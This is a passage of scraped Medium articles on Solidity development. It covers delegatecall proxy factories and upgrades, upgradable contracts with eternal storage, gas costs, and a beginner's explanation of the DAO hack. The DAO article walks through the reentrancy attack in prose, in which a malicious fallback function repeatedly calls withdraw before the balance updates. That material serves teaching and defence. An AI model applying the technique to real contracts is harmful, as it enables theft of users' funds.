Byzantium hard fork. We can now pass along dynamically sized return values in our proxy like so:// inside of the Proxy assembly {} section:let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 0)returndatacopy(freememstart, 0, returndatasize())switch successcase 0 { revert(freememstart, returndatasize()) }default { return(freememstart, returndatasize()) }With this change, you\u2019ll be able to pass that supercalifragilisticexpialidocious flavor along with the proxy:All in all, this proxy costs 302,979 gas (~$6.06) to deploy, saving 45% of deployment costs over time, for a relatively simple contract at that. For larger more complex contracts, this proxy would save even more gas!All of our generic proxies from this point forward in this article will use this dynamic return mechanism.Proxy FactoriesBoth the initialization method and the multiple inheritance approaches to proxying existing contracts add additional requirements to the construction of proxies, but proxies should behave practically identically to their proxied objects. Factories can hide that implementation detail behind a facade, providing users with a consistent interface for creating something functionally equivalent to Kombucha instances.Let\u2019s draft up a Kombucha factory for our original Kombucha:contract KombuchaFactory {    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha)    {        return new Kombucha(flavor, fillAmount, capacity);    }}This factory method right now is functionally equivalent to just a constructor call, but it costs about as much as constructing a full Kombucha instance because, well, it is constructing a full Kombucha instance. Actually, the factory createKombucha transaction costs 432,694 gas, which is about 120K ($2.40) less gas than via the constructor directly! This is a consequence of the Kombucha code being loaded from the factory, and not being sent as part of the transaction data.Let\u2019s make a factory, but this time, let\u2019s say Kombucha is proxy-friendly and has a correctly written init method \u2014 that is, let\u2019s use checkpoint init. Instead of creating full Kombucha instances, we want the factory to create Proxy instances referring to a master Kombucha copy:contract KombuchaFactory {    Kombucha private masterCopy;    constructor(Kombucha _masterCopy) public {        masterCopy = _masterCopy;    }    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha kombucha)    {        kombucha = Kombucha(new Proxy(masterCopy));        kombucha.init(flavor, fillAmount, capacity);    }}Since we are able to initialize the proxy storage in the same transaction that we create the proxy in, we guarantee that instances created by the factory method are initialized properly, without any risk of another user intervening in the initialization step. Moreover, our proxy-producing factory is a drop-in replacement for the full instance factory, and the cost of creating new Kombucha instances will be drastically cut with the use of this proxy-producing factory.Similarly, over in checkpoint subclass, we can tidy up the interface to the multiple inheritance approach to proxying for the same effect:contract KombuchaFactory {    Kombucha private masterCopy;    constructor(Kombucha _masterCopy) public {        masterCopy = _masterCopy;    }    function createKombucha(string flavor, uint fillAmount, uint capacity)        public        returns (Kombucha)    {        return Kombucha(new KombuchaProxy(masterCopy, flavor, fillAmount, capacity));    }}Similarly to earlier, the factory pattern reduces the cost of creating instances even more because the KombuchaProxy bytecode does not need to be sent as transaction data: it is copied from the factory. This puts the gas cost per instance at 208063, or about $4.16. This is almost as cheap as this\u2019ll get.A Note about Transaction CostsI don\u2019t want to give the impression that proxies somehow magically save gas in all circumstances: there is a tradeoff. While proxies may create immense savings in terms of code duplication on the chain, it loses gas in each call to the proxy because of the delegatecall indirection. For example, normally a call to drink 30 units on a Kombucha instance would take 32,369 gas, but if that call was proxied, the transaction would require 33,559 gas (~$0.02 difference). If those calls are made thousands of times, the cost of using the contract can overshadow costs in its creation.Proxying helps most in situations where you need many instances of a contract: for example an instance per user, or when creating many instances of a contract type in transactions.Logic UpdatesFundamentally, a proxy outsources its functionality to a contract containing the logic it\u2019s supposed to emulate. In the examples we\u2019ve explored above, that contract is defined by an address present in the storage of the proxy which the contract actually has access to, meaning the proxied contract can actually alter the address to point somewhere else! This was hinted at earlier with the fillAmount accessor returning the integer value of the proxied address, and in fact, we could have changed proxied with a call to drink when the storage layout wasn\u2019t fixed!Let\u2019s imagine a scenario in which we have our Kombucha contract deployed. Sometime later, maybe we will want to update our Kombucha contract so that it is by default capped, and it must be uncapped before it can be filled or drunk. Also, we\u2019ll toss in an extra keccak256 into the return value of drink for good measure (for more reasons, obviously).We will continue this discussion from checkpoint subclass, but the following can apply (with some modifications) to the initialization method approach to proxying as well.Updating the Proxied AddressFirst, we want to be able to update proxied in some way. We shouldn\u2019t allow just anybody to do this operation, so let\u2019s restrict it to an owner of the contract. The contract, then, would somehow need to know its owner, and have semantics for dealing with the owner vs. non-owners. Let\u2019s express this concept with an Ownable contract:contract OwnableData {    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    address internal owner;    constructor(address _owner)        public    {        owner = _owner;    }}contract Ownable is OwnableData {    function setOwner(address newOwner)        public        onlyOwner    {        owner = newOwner;    }}There are two ways of going about updating a proxy\u2019s logic. One way is to extend Proxy to be updatable:contract UpdatableProxyData is ProxyData, OwnableData {}contract UpdatableProxyShared is ProxyData, Ownable {    function updateProxied(address newProxied)        public        onlyOwner    {        proxied = newProxied;    }}contract UpdatableProxy is Proxy, UpdatableProxyShared {    constructor(address proxied, address owner)        public        Proxy(proxied)        OwnableData(owner)    {}}contract UpdatableProxyImplementation is UpdatableProxyShared {    constructor() public OwnableData(0) {}}UpdatableProxyImplementation is extraneous in this case where we put updating logic on the proxy, but will be applicable in the case where we put updating logic on the proxied implementation instance.UpdatableProxyData and UpdatableProxy can be nearly drop-in replacements for their non-updatable counterparts:contract KombuchaDataInternal is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaData is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaProxy is UpdatableProxy, KombuchaDataInternal {    function KombuchaProxy(address proxied, address owner, string _flavor, uint _fillAmount, uint _capacity)        public        UpdatableProxy(proxied, owner)    {        // ...    }}Note that now, the KombuchaProxy constructor needs an owner to be specified. Also, with this approach, the logic to update proxied resides inside the proxy itself and cannot be swapped out:This additional logic would also be deployed alongside the proxy, which would make instances of the proxy heavier,\u00a0and\u00a0would essentially\u00a0determine\u00a0the\u00a0upgrading\u00a0process\u00a0from\u00a0the\u00a0start. However, this way also guarantees that as long as there is a valid owner, there will be an update mechanism for the proxied logic.The other approach is to put the updating logic in the proxied contract:contract KombuchaDataInternal is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaData is UpdatableProxyData, KombuchaHeader { ... }contract KombuchaProxy is Proxy, KombuchaDataInternal {    function KombuchaProxy(address proxied, address owner, string _flavor, uint _fillAmount, uint _capacity)        public        Proxy(proxied) OwnableData(owner)    {        // ...    }}contract Kombucha is UpdatableProxyImplementation, KombuchaData {    // ...}With this method, we can just use the generic Proxy as the underlying implementation for KombuchaProxy, as the update functionality is contained in Kombucha itself, through UpdatableProxyImplementation:Since the updating logic is in the proxied contract, we can also change the update procedures/policy per update. For example, we can decide that a version is final and simply ensure all code from that version does not affect proxied in the final update.For the rest of this article, we will mostly assume the use of the second approach here where we place the updating logic in the proxied implementation contract and not the proxy, but the rest of the discussion should apply similarly to the first approach.Authoring an UpdateLet\u2019s recall the scenario we are trying to handle. We want to update Kombucha so that:it is by default capped, and it must be uncapped before it can be filled or drunk. Also, we\u2019ll toss in an extra keccak256 into the return value of drink for good measure (for more reasons, obviously).Normally, we might write the updated Kombucha contract as follows:contract Kombucha2 is Kombucha {    bool public capped;        constructor(string flavor, uint fillAmount, uint capacity)        public        Kombucha(flavor, fillAmount, capacity)    {        capped = true;    }    function uncap() public {        require(capped);        capped = false;    }        function fill(uint amountToAdd) public {        require(!capped);        super.fill(amountToAdd);    }    function drink(uint amountToDrink) public returns (bytes32) {        require(!capped);        return keccak256(super.drink(amountToDrink));    }}Before, we might\u2019ve told our customers that from now on, use this new Kombucha2 instead of Kombucha, and if they need to hold on to their old Kombucha instance, then they\u2019re out of luck.Of course since this section is about updatable proxies, we\u2019re going to make it so that they don\u2019t have to do that.Let\u2019s adapt the vanilla update for the multiple inheritance approach to proxies. We will see how normal inheritance might be adapted for this new case:contract Kombucha2DataInternal is KombuchaDataInternal {    bool internal capped;}contract Kombucha2Data is KombuchaData {    bool public capped;}contract Kombucha2Proxy is KombuchaProxy, Kombucha2DataInternal {    function Kombucha2Proxy(address proxied, address owner, string flavor, uint fillAmount, uint capacity)        public        KombuchaProxy(proxied, owner, flavor, fillAmount, capacity)    {        capped = true;    }}contract Kombucha2 is Kombucha, Kombucha2Data {    // updated contract methods, NOT variables and constructor...    // i.e. uncap, fill, and drink from above}This works fine enough on its own, but what happens when we update an existing Kombucha instance to use Kombucha2?Trying to upgrade an existing Kombucha-like instance to that new Kombucha2 logicIt turns out that the update didn\u2019t exactly work as we\u2019ve expected:We\u2019ve introduced capped in the update, but our business requires that variable to start off as true after the update. How can we ensure that when we update the contracts, the contract state adjusts itself accordingly?Storage State MigrationThe problem of maintaining the correctness of an application\u2019s state after a change to the application\u2019s logic is similar to another problem in traditional applications: database migrations. Let\u2019s adapt their methods. We need a way to migrate storage state during an update.First we will modify updateProxied to take an Update instead of the new implementation address:interface Update {    function implementationBefore() external view returns (address);    function implementationAfter() external view returns (address);    function migrateData() external;}contract UpdatableProxyShared is ProxyData, Ownable(0) {    function updateProxied(Update update)        public        onlyOwner    {        require(update.implementationBefore() == proxied);        proxied = update;        Update(this).migrateData();        proxied = update.implementationAfter();    }}Then, we realize the update as follows:contract Kombucha2Update is    KombuchaDataInternal,    Kombucha2DataInternal,    Update{    Kombucha internal kombucha;    Kombucha2 internal kombucha2;    constructor(Kombucha _kombucha, Kombucha2 _kombucha2)        public        OwnableData(0)    {        kombucha = _kombucha;        kombucha2 = _kombucha2;    }    function implementationBefore() external view returns (address)    {        return kombucha;    }        function implementationAfter() external view returns (address) {        return kombucha2;    }        function migrateData() external {        capped = true;    }}To see the mechanics of updating, let\u2019s set up an instance of Kombucha, create a KombuchaProxy which we own, and view it as Kombucha, as before. Then, we\u2019ll create the Kombucha2 to which the proxy will refer:Pretty standard setup, but let\u2019s now view our proxy as a Kombucha2:The capped accessor errors if we try to use it because the proxied Kombucha contract does not support that request. Let\u2019s create an instance of Kombucha2Update using the addresses of the original logic-bearing contracts:The Kombucha2Update contract is designed to be storage-aligned with both Kombucha and Kombucha2. In this case, Kombucha2 has a storage layout which contains the entirety of Kombucha\u2019s storage layout (so the declaration of KombuchaDataInternal in the Kombucha2Update contract\u2019s superclass list was extraneous), but in general, storage schema changes may be tricky to implement. You can see the way that the update accommodates both storage layouts via its header:contract Kombucha2Update is ProxyData, OwnableData(0), KombuchaDataInternal, Kombucha2DataInternal, Update { ... }We will be using data at two storage locations during the update: the update and the proxy. The update storage contains the addresses of the implementationBefore (Kombucha) and the implementationAfter (Kombucha2), which is why we construct the update instance with these parameters. The proxy storage contains the data which is to be migrated. Finally, code at the update describes how storage should be migrated from a Kombucha compatible dataset to a Kombucha2 compatible dataset. This is why, in the modified updateProxied method, we ask the update directly for the implementationBefore and implementationAfter, but we proxy the call to migrateData:require(update.implementationBefore() == proxied);proxied = update;Update(this).migrateData();proxied = update.implementationAfter();Doing this allows us to update Kombucha to Kombucha2, ensuring that capped is set and that migrateData is called only at the time of the update to set capped to true:We\u2019ve successfully updated the proxy to use Kombucha2!Programmable Update PoliciesCurrently, our update policy relies on the trustworthiness of an owner, as this owner would be able to update the logic of the contract at any moment. However, in scenarios where a proxy instance is meant to be widely used by many different parties, handing a single authority the power to alter this proxy instance\u2019s implementation on a whim may be too risky. A method of reducing the trust required of an entity in such a role may be desirable.For example, perhaps it is desired that a kombucha contract proxy instance which everybody uses is updated to an address telegraphed at least a couple of months in advance, so any users of that instance may have time to prepare themselves for the event the Kombucha implementation is swapped out for the Kombucha2 implementation.Here is one way to implement this policy:contract TimedUpdatableProxyDataInternal is UpdatableProxyData {    uint internal updateAllowedStartTime;    Update internal plannedUpdate;}contract TimedUpdatableProxyData is UpdatableProxyData {    uint public updateAllowedStartTime;    Update public plannedUpdate;}contract TimedUpdatableProxyShared is UpdatableProxyShared, TimedUpdatableProxyData {    function planUpdate(Update update)        public        onlyOwner    {        plannedUpdate = update;        updateAllowedStartTime = now + 30 seconds;    }    function updateProxied(Update update)        public    {        require(            updateAllowedStartTime != 0 &&            now >= updateAllowedStartTime &&            update == plannedUpdate        );        super.updateProxied(update);        updateAllowedStartTime = 0;        plannedUpdate = Update(0);    }}contract TimedUpdatableProxy is UpdatableProxy, TimedUpdatableProxyShared {    constructor(address proxied, address owner)        public        UpdatableProxy(proxied, owner)    {}}contract TimedUpdatableProxyImplementation is TimedUpdatableProxyShared {    constructor() public OwnableData(0) {}}These are drop-in replacements for their UpdatableProxy counterparts. (Also, the update delay has been set to 30 seconds to avoid waiting forever for testing purposes). While the update is planned, the actual update contract is available on the chain for anyone to inspect, and updateProxied will not work unless the supplied update matches the planned update and the delay has passed.Like the plain updatable contract, this extended update policy may be placed on either proxies or implementations, with similar implications, and this is just an example of what can be done.Further NotesProxy Implementation RefinementsSolidity offers a higher-level construct for performing delegatecalls than at the assembly level. The fallback function for the proxy may be written in the following way:function() public payable {    bool success = proxied.delegatecall(msg.data);    assembly {        let freememstart := mload(0x40)        returndatacopy(freememstart, 0, returndatasize())        switch success        case 0 { revert(freememstart, returndatasize()) }        default { return(freememstart, returndatasize()) }    }}At the time of this writing, the assembly generated from the higher-level version of this code is a little more verbose, but it works, and for clarity, this may be the preferred approach in the future.EIP 897You may be aware of EIP 897, which deals exactly with the proxies discussed in this article. We can implement EIP 897 support on these proxies simply by adding the appropriate methods:contract Proxy is ProxyData {    // ...        function implementation() public view returns (address) {        return proxied;    }    function proxyType() public pure returns (uint256) {        return 1; // for \"forwarding proxy\"                  // see EIP 897 for more details    }}contract UpdatableProxy is Proxy, UpdatableProxyShared {    // ...    function proxyType() public pure returns (uint256) {        return 2; // for \"upgradable proxy\"                  // again, see EIP 897    }}Removing the Extra Storage SlotFor simply forwarding proxies, there\u2019s not actually any need to put the implementation address in storage, as it will not change, unlike upgradable proxies. This has been hinted at before (e.g. having to replace cafecafe\u2026 with the appropriate address suggests that the code contains the implementation address directly), and now there is a whole generic proxy factory which creates proxy instances while swapping out the implementation address.There\u2019s a bit of a catch in that it requires the proxy bytecode to be directly loaded into memory for the contract creation call. However, this may change in the future and become directly supported by Solidity without such assembler tricks.Another thing you may notice about these more recent implementations of proxy factories is the presence of a bytes data parameter. This makes these proxy factories a generalization of the init-based approached explored earlier, as the data is used as a subsequent message call to the newly created contract, and may be, for example, a message call to init with certain parameters!Can we remove the requirements which are imposed by the init approach to proxy construction, but keep the generality of this proxy factory? Unfortunately, in order to keep a generic proxy factory, we\u2019d have to deploy the construction code onto the chain somewhere anyway. That entails modifying the underlying generic forwarding proxy to behave something like in the following manner:contract Proxy {    address private constant constructorPlaceholder = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;    address private constant implementationPlaceholder = 0xf00Df00dF00dF00dF00DF00Df00df00df00Df00d;    constructor(bytes data) public {        bool success = constructorPlaceholder.delegatecall(data);        if(!success) revert();    }    function() public payable {        bool success = implementationPlaceholder.delegatecall(msg.data);        assembly {            let freememstart := mload(0x40)            returndatacopy(freememstart, 0, returndatasize())            switch success            case 0 { revert(freememstart, returndatasize()) }            default { return(freememstart, returndatasize()) }        }    }}We\u2019d have to deploy code for initialization separately to the chain anyway, perhaps in this form:contract KombuchaConstructor is KombuchaData {    function init(string _flavor, uint _fillAmount, uint _capacity) public {        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }}Also, the generic proxy factory interface would not be ideal for use with client-side libraries at that point, requiring developers to especially format the constructor parameters data which is supposed to be dispatched through the factory to the constructor instance.FinIs Multiple Shadow Clone Jutsu actually an application of this proxy factory pattern?To sum up, we can now make cheap copies of our contracts.And we can upgrade them.Thanks for sticking it through this article about delegate proxies, and happy coding!", "responses": 9, "tags": ["Ethereum", "Gnosis", "Solidity", "Proxy", "Development"]}, {"title": "Explaining the DAO exploit for beginners in Solidity", "post_link": "https://medium.com/@MyPaoG/explaining-the-dao-exploit-for-beginners-in-solidity-80ee84f0d470?source=search_post", "author_name": "Maria P. Gomez Gelvez", "author_link": "https://medium.com/@MyPaoG", "publish_date": "2016-10-16", "last_modified_date": "2018-06-21", "readtime": "3.69", "claps": 553, "voters": 86, "content": "Explaining the DAO exploit for beginners in SolidityThe fallback functionMaria P. Gomez GelvezFollowOct 16, 2016 \u00b7 4 min readYes, another article about the DAO attack BUT this time it is for dummies ;). I mean, I want to explain the attack in simple terms and steps so beginners, and even non-technical Ethereum enthusiasts, can have a technical understanding of what happened to one of the most popular Ethereum applications. I\u2019m not a software engineer nor an experienced Ethereum developer, I\u2019m just a beginner!The hacker exploited a bug in the code of the DAO and stole more or less $50 million worth of ether. I will focus here only on the main technical issue of the exploit: The fallback function. For a more detailed and advanced recount of the attack, the blog posts by Phil Daian and Peter Vessenes are highly recommended.Basic conceptsTo start off, keep in mind that in Ethereum there are two types of accounts: (i) externally owned accounts controlled by humans and (ii) contract accounts controlled by code. This is important because only contract accounts have associated code, and hence, can have a fallback function.In Ethereum all the action is triggered by transactions or messages (calls) set off by externally owned accounts. Those transactions can be an ether transfer or the triggering of contract code. Remember, contracts can trigger other contracts\u2019 code as well.Smart contracts are written in high-level programming languages such as Solidity but for those contracts to be uploaded on the blockchain, they need to be compiled into bytecode, a low-level programming language executed by the Ethereum Virtual Machine (EVM). Said bytecode can be interpreted with opcodes.When a contract calls or sends money to another contract that code compiles in the EVM bytecode, invoking the call function. But, there is a difference: When calling another contract the call function provides specific function identifiers and data, however, when sending money to another contract, the call function has a set amount of gas but no data (case b below), and thus, triggers the fallback function of the called contract.The attackThe fallback function abuse played a very important role in the DAO attack. Let\u2019s see what a fallback function is and how it can be used for malicious purposes.Fallback functionA contract can have one anonymous function, known as well as the fallback function. This function does not take any arguments and it is triggered in three cases [1]:a. If none of the functions of the call to the contract match any of the functions in the called contractb. When the contract receives ether without extra datac. If no data was suppliedExampleThe following is sample code for a contract vulnerable to a malicious fallback function of another contract. In this example we have two contracts: (i) the contract Bank (vulnerable contract) and (ii) the contract BankAttacker (malicious contract). Imagine that the contract Bank is the DAO smart contract but much more simplified and the contract BankAttacker is the hacker\u2019s malicious smart contract that emptied the DAO.The hacker initiates the interaction with contract Bank through its malicious contract and the sequence of the actions is as follows:The first thing the hacker does is send ether (75 wei) to the vulnerable contract through the deposit function of the malicious contract. This function calls the addToBalance function of the vulnerable contract.Then, the hacker withdraws, through the withdraw function of the malicious contract, the same amount of wei (75), triggering the withdrawBalance function of the vulnerable contract.The withdrawBalance function first sends ether (75 wei) to the malicious contract, triggering its fallback function, and last updates the userBalances variable (that this piece is done last is very important for the attack).The malicious fallback function calls the withdrawBalance function again (recursive call), doubling the withdraw, before the execution of the first withdrawBalance function finishes, and thus, without updating the userBalances variable.In this example, there are only two recursive calls to the withdrawBalance function so the hacker ends up with a balance of 150 wei. They took more than they should (75 wei) because the userBalance variable is the last thing set/updated.One important point is that unlike the JavaScript\u2019s blocks of code, the EVM executes instructions synchronously, one after the other, and this is why the userBalance variable is updated only after the previous code is finished.The following is a more graphic explanation of the example. The instances referred in this graphic are the different states of the contracts saved in the blockchain. In the graphic you will see that the hacker, through his/her/their external account, triggers the malicious contract, so this contract can interact with the vulnerable contract.Last, here is the example in JavaScript, just in case you are not very familiar with Solidity yet.ConclusionI\u2019ve learned a lot understanding the DAO exploit, mainly that programming smart contracts is not an easy task and it should be done rigorously. I still have lots of unsolved questions such as: Do we need fallback functions at all? Apparently this was fixed in the new version of Solidity. However, the problem is still present at the EVM level because a hacker can program in opcode and avoid the Solidity\u2019s security measures.Meanwhile, I\u2019m working with two friends David Jaramillo and Graziano Pirovano (great software engineers) on a software architecture project, which aims to protect programmers from the risks of malicious fallback functions within the current Ethereum ecosystem. More about this project to come!Thank you to Graziano Pirovano y David Jaramillo.Footnotes:[1] http://solidity.readthedocs.io/en/latest/contracts.html", "responses": 4, "tags": ["Ethereum", "Blockchain", "Fallback Function", "Smart Contracts", "Thedao"]}, {"title": "How to write upgradable smart contracts in solidity !", "post_link": "https://medium.com/quillhash/how-to-write-upgradable-smart-contracts-in-solidity-d8f1b95a0e9a?source=search_post", "author_name": "Himanshu Chawla", "author_link": "https://medium.com/@himanshuchawla", "publish_date": "2018-04-25", "last_modified_date": "2019-05-15", "readtime": "7.41", "claps": 1151, "voters": 79, "content": "How to write upgradable smart contracts in solidity !Himanshu ChawlaFollowApr 25, 2018 \u00b7 8 min readWhile working on smart contracts security audits platform QuillAudits at QuillHash, we are giving most of the time to research about best security practices in smart contracts. QuillAudits considers the following distinct and crucial facets of the smart contract code: Whether the code is secure. Whether the code corresponds to the documentation (including white paper). Whether the code meets best practices in efficient use of gas, code readability, etc.An approach to upgrade contracts must be in the armour to prevent damage made by programming bugs after contract got deployed.The Topic of upgradeable contracts is not very new to the world of ethereum. There are some different approaches to upgrade smart contracts.Some approaches we considered in development are:-Separate logic and data.Partially upgradable smart contracts system.Separate logic and data in key value pairs.Eternal storage with proxy contractWith first three approaches the contract can be updated by pointing users to use the new logic contract (through a resolver such as ENS) and updating the data contract permissions to allow the new logic contract to be able to execute the setters.In forth approach we don\u2019t need to do this redirection and its is very flexible approach to update smart contracts.We found that eternal storage with proxy contract approach is flawless till now.Readers are most welcome to comment if you know any flaw in this approach. It will be very helpful for developers community.There is a good reason for and against being able to update smart contracts.The good reason is all the recent hacks were based on programming error and could be fixed very easily if it was possible to upgrade those contracts.However the ability to upgrade smart contracts after they got deployed is somewhat against the ethics and immutability of blockchain.People need to trust you that you are a good boy. One thing that might makes sense would be to have multi-sig-upgrades, where the \u201cOK\u201d from multiple people is necessary before a new contract is deployed and can access the storage.I think that it is storage records which needs to be immutable in blockchain.Logic must be improved with time as in all software engineering practices.No one can guarantee to develop bug free software in first version.So Upgradeable smart contracts with some upgrading governance mechanism can save many hacks.In this post, I will touch the upgrade mechanism and in follow up post i will try to come with best contract upgrading governance mechanism.So lets start with implementation approach !!The most important thing to consider when upgrading contracts is how to preserve the state of the original contract in the upgraded contract.The state of the contract can be separated from the functionality of the contract. This approach allows multiple contracts to share the same state.In this approach, a proxy contract will act as a immutable storage contract and delegate contract will contain the functionality.The storage structure of both these contracts must be similar.To upgrade the logic of contract we need to inform the proxy contract the address of new delegate contract .When a transaction is sent to proxy contract ,it does not know about the specified function in the transaction.Proxy contract will proxy the transaction to what we\u2019ll refer to as a \u201cdelegate\u201d contract (Which contains the functionality logic).This is done using the native EVM code, delegate call.With delegate call, a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.When a proxy contract uses a delegate contract\u2019s functionality, state modifications will happen on the proxy contract. This means that the two contracts need to define the same storage memory. The order that storage is defined in memory needs to match between the two contracts.We will deploy these contracts initially :-key Storage Contract (Contains the shared state)Delegate contractV1 and Delegate contractV2Proxy Contract (Contains the delegate call functionality)Key Storage contract :-It contains a common storage for all storage state variables which will be shared among all versions of smart contract.It also contains getter and setter functions to update and get the value of state from delegate contract.Key Storage contract can be consumed by any delegate contract via proxy contract once deployed.We cannot create new getter and setters once key storage got deployed so we need to consider this while designing the initial version of smart contract.The best approach is to make mappings for every type of field in key storage contract.Where the key of mapping will be the the name of the key simply in bytes and value will of the type declared in mapping.For ex:- mapping(bytes32 => uint)Now we can use this mapping to set and get any integer value from delegate contract by calling key storage getter and setter function for uint type.For ex: we can set the total supply with the key \u201ctotalSupply\u201d and with any uint value.But wait something is missing,Now anyone can call our key storage contract getter and setter function and update the state of storage which is getting used by our delegate contract.So to prevent this unauthorised state change we can use the address of proxy contract as the key of mapping.mapping(address => mapping(bytes32 => uint)) uintStorageIn our setter function:function setUintStorage(bytes32 keyField, uint value) public {uintStorage[msg.sender][keyField] = value}Now as we are using msg.sender address in setter function and only this state change will reflected in proxy contract state when it uses getter function to get the state.Similarly we can create other state mappings along with getter and setter functions as shown in the code below:-Delegate contract :-Delegate contract contains the actual functionality of dApp.It also contains a local copy of KeyStorage contract.In our dApp ,if we include a certain functionality and later we found a bug in deployed contract ,in that case we can create a new version of delegate contract.In code below ,Delegate contract version 1 (\u201cDelegateV1.sol\u201d) is deployed.After deploying DelegateV1 we noticed the number of owners can be set by any user .So now we want to upgrade the smart contract so that only owner of contract can set number of owners.We cannot change the code of already deployed contract in ethereum. So obvious solution is to create a new contract and new contract too will contain a local copy of Key Value contract. Here we are creating DelegateV2.sol contract with onlyOwner modifier added.Now we have created a new contract but the storage of previous contract is not available in new version of contract.So we can include a reference to actual keyStorage contract in every version of delegate contract .In this way every version of delegate contract shares a same storage.But one thing is not desirable here, we need to tell every user about the address of updated version of contract so that they can use updated contract.It sounds stupid.So we will not store actual copy of key storage contract in every version of delegate contract .To get a shared storage proxy contract comes in to the rescue , lets move on to proxy contract.Proxy Contract:-A proxy contract uses the delegatecall opcode to forward function calls to a target contract which can be updated. As delegatecall retains the state of the function call, the target contract\u2019s logic can be updated and the state will remain in the proxy contract for the updated target contract\u2019s logic to use. As with delegatecall, the msg.sender will remain that of the caller of the proxy contract.A delegate call can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.SO we just need to pass the address of new version of contract to proxy contract via upgradeTo function.The code of proxy contract is quite complicated in fallback function as here low level delegate call assembly code is used.Let break it down simply what is getting done in assembly code:-delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0);In above function delegate call is calling code at \u201c_impl\u201d address with the input \u201cadd(data,0x20)\u201d and with input memory size \u201cmload(data)\u201d,delegate call will return 0 on error and 1 on success and result of the fallback function is whatever will be returned by the called contract function.In proxy contract we are extending StorageState contract which will contain a global variable to store address of keyStorage contract.The order of extending storage state contract before ownable contract is important here.This storage state contract will be extended by our delegate contracts and all the functions logic executed in delegate contract will be from the context of proxy contract.The order of storage structure of Proxy contract and Delegate contract must be same.Now user will always interact with dapp via same address of proxy contract and state of key storage contract seems to be shared among all versions of contract but in actual only proxy contract contains the reference to actual keyStorage contract.Delegate contracts contains local copy of keyStorage contract to get the getter ,setter functions logic and to have similar storage structure like proxy contract but actual storage changes are getting done from the context of proxy contract only.Deploying and testing it together:-Here output of test cases will be : 10 10 and 20We are calling getNumberOfOwners() three times in test case.First to get the state change by DelegateV1 contract .Second time to get the state modified by DelegateV1 from DelegateV2 contract and we success fully managed to retain the state modified by DelegateV1 and third time to get the state modification done by DelegateV2 contract.Note here that we are calling getNumberOfOwners() every time from the same address of proxy contract.So we successfully managed to update the functionality of our contract with out losing the previous state.If we call setNumberOfOwners() from any other address except account[2] which is contract owner address, it will throw revert error.Lets wind up the article with some diagrams:-call upgrade to DelegateV2You can see the complete code here:-https://github.com/Quillhash/upradeableToken.gitThanks for reading. Hopefully this guide has been useful to you and will help you to write upgradable smart contracts in solidity and Also do check out our earlier blog posts.At QuillHash, we understand the Ethereum Blockchain and have a good team of developers who can develop blockchain applications like Smart Contracts, dApps, DeFi, DEX on the Ethereum Blockchain.To be up to date with our work, Join Our Community :-Telegram | Twitter | Facebook | LinkedInReferences:https://blog.colony.io/writing-upgradeable-contracts-in-solidity-6743f0eecc88https://medium.com/level-k/flexible-upgradability-for-smart-contracts-9778d80d1638https://medium.com/cardstack/upgradable-contracts-in-solidity-d5af87f0f913https://blog.zeppelinos.org/smart-contract-upgradeability-using-eternal-storage/https://medium.com/rocket-pool/upgradable-solidity-contract-design-54789205276d", "responses": 11, "tags": ["Ethereum", "Solidity", "Blockchain"]}, {"title": "Solidity 102 #1: Keeping Gas Cost under Control", "post_link": "https://medium.com/bandprotocol/solidity-102-1-keeping-gas-cost-under-control-ae95b835807f?source=search_post", "author_name": "Sorawit Suriyakarn", "author_link": "https://medium.com/@sorawit", "publish_date": "2019-06-13", "last_modified_date": "2019-07-08", "readtime": "5.11", "claps": 2993, "voters": 82, "content": "Solidity 102 #1: Keeping Gas Cost under ControlSorawit SuriyakarnFollowJun 13 \u00b7 6 min readThis is part 1/N of Band Protocol\u2019s \u201cSolidity 102\u201d series. We explore and discuss data structures and implementation techniques for writing efficient Solidity code under Ethereum\u2019s unique EVM cost model. Readers should be familiar with coding in Solidity and how EVM works in general.Welcome to Band Protocol\u2019s Solidity 102. In this introductory article, we discuss important points you should be aware when writing performant smart contracts in Solidity. While Solidity\u2019s syntax looks somewhat similar to that of JavaScript or C++, its EVM runtime is totally different. Knowing the limitation of EVM and the techniques to workaround those constraints will help you write better Solidity. The article will focus on high level ideas, and we will cover concrete implementations in the subsequent articles of the series.Interaction with Persistent StorageSee Ethereum Yellow Paper Appendix G for full reference of EVM opcode cost.Persistent storage on opcode (SSTORE) is extremely expensive. The current cost per one 32-byte word is 20,000 Gas (~ 5 cents at 10 Gwei gas price and $250 per ETH) for the first time a particular slot is set, and 5,000 Gas for each subsequent modification. While the cost is \"constant\" in the theoretical sense of complexity, it is more than a thousand times the cost of arithmetic or memory operations, which mostly take less than 10 Gas per operation. Combining with the fact that Gas limit of one whole block (as of June 2019) is ~8,000,000 Gas, developers should design their smart contracts to minimize amount of storage slots needed. Note that the impact of using storage unnecessarily will get with the upcoming(?) state rent upgrade. Fortunately there are a few methods that can help mitigate the problem.Don\u2019t Store Unnecessary DataThis may sound obvious, but is very well worth mentioning. When writing smart contracts, you should store only what\u2019s necessary for transaction validation. Data such as transaction memo or long description not related to contract logic may not need to be kept in contract storage. Consider the following PollContract smart contract, which user can create a poll, which can be automatically executed when reaching a certain threshold.If createPoll function is called often, one may consider removing memo from Poll struct it does not directly impact the contract's logic. Since the event containing memo is already emitted, only the hash value (32 bytes) of memo may be stored for quick verifications afterward. The tradeoff between gas cost and contract simplicity should be carefully considered by developers.Additionally, throughout Band Protocol\u2019s Solidity lesson, we will cover various data structure implementations, such as linked-lists, iterable maps, Merkle trees, etc., that are specifically designed to reduce the amount of data needed to store on the Ethereum long-term storage.Pack Multiple Small Variables into Single WordEVM operates under 32-byte word memory model. Multiple variables that are smaller than 32 bytes can be packed into a single storage slot to minimize the number of SSTORE opcodes. Although Solidity automatically tries to pack small elementary types into the same slot if possible, naive struct member ordering may prevent the compiler to do that. Consider Good and Bad struct below.Example implementation of Good and Bad struct member ordering.Using solc 0.5.9+commit.e560f70d 